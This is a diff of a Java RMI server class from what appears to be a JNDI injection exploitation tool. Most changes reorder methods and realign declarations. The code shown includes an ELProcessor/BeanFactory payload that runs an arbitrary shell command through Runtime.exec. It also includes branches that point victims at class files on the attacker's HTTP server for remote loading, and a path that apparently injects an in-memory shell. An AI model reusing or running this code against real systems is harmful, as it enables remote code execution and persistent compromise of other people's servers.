@@ -44,30 +44,14 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
 
     private final ServerSocket ss;
     private final Object       waitLock = new Object();
-    private       boolean      exit;
     private final URL          classpathUrl;
+    private       boolean      exit;
 
 
     public RMIServer(int port, URL classpathUrl) throws IOException {
         this.classpathUrl = classpathUrl;
         this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
     }
-
-
-    /**
-     *
-     */
-    public void close() {
-        this.exit = true;
-        try {
-            this.ss.close();
-        } catch (IOException ignored) {
-        }
-        synchronized (this.waitLock) {
-            this.waitLock.notify();
-        }
-    }
-
 
     public static void start() {
         String url = "http://" + ip + ":" + rmiPort;
@@ -82,6 +66,39 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         }
     }
 
+    public static ResourceRef execByEL() {
+
+        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+        ref.add(new StringRefAddr("forceString", "x=eval"));
+        ref.add(new StringRefAddr("x", String.format(
+                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
+                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
+                        ")",
+                Config.command
+        )));
+
+        return ref;
+    }
+
+    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        ois.readInt(); // method
+        ois.readLong(); // hash
+        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
+    }
+
+    /**
+     *
+     */
+    public void close() {
+        this.exit = true;
+        try {
+            this.ss.close();
+        } catch (IOException ignored) {
+        }
+        synchronized (this.waitLock) {
+            this.waitLock.notify();
+        }
+    }
 
     @Override
     public void run() {
@@ -252,29 +269,29 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             if (object.startsWith("Local")) {
                 System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 发送本地类加载引用"));
                 System.out.println("-------------------------------------- RMI Local  Refenrence Links --------------------------------------");
-                String[] cmd = object.split(" ");
+                String[]    cmd       = object.split(" ");
                 final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(cmd[1]));
                 Reflections.setFieldValue(rw, "wrappee", EchoClass);
             } else if (object.startsWith("E-")) {
-                String object1 = object.substring(object.indexOf('-') + 1);
-                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(object1));
-                String className = EchoClass.getName();
-                String className1 = className.replaceAll("\\.", "/");
-                String turl = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
-                String classPath = className + ".class";
+                String      object1    = object.substring(object.indexOf('-') + 1);
+                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(object1));
+                String      className  = EchoClass.getName();
+                String      className1 = className.replaceAll("\\.", "/");
+                String      turl       = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
+                String      classPath  = className + ".class";
                 System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
                 System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
                 Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", classPath, turl));
             } else if (object.startsWith("M-")) {
                 //M-EX-MS-RFMSFromThreadF-bx#params
-                String object1 = object.substring(object.indexOf('-') + 1);
-                String[] parts = object1.split("#");
-                String[] parts1 = parts[1].split(" ");
+                String   object1 = object.substring(object.indexOf('-') + 1);
+                String[] parts   = object1.split("#");
+                String[] parts1  = parts[1].split(" ");
                 InjShell.init(parts1);
-                String className = Gadgets.createClassB(parts[0]);
+                String className  = Gadgets.createClassB(parts[0]);
                 String className1 = className.replaceAll("\\.", "/");
-                String turl = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
-                String className2 = className1.substring(className1.lastIndexOf('/') +1 );
+                String turl       = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
+                String className2 = className1.substring(className1.lastIndexOf('/') + 1);
                 System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
                 System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
                 Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", className2, turl));
@@ -291,27 +308,6 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         }
         return true;
     }
-
-    public static ResourceRef execByEL() {
-
-        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-        ref.add(new StringRefAddr("forceString", "x=eval"));
-        ref.add(new StringRefAddr("x", String.format(
-                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
-                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
-                        ")",
-                Config.command
-        )));
-
-        return ref;
-    }
-
-    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
-        ois.readInt(); // method
-        ois.readLong(); // hash
-        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
-    }
-
 
     static final class MarshalOutputStream extends ObjectOutputStream {
 
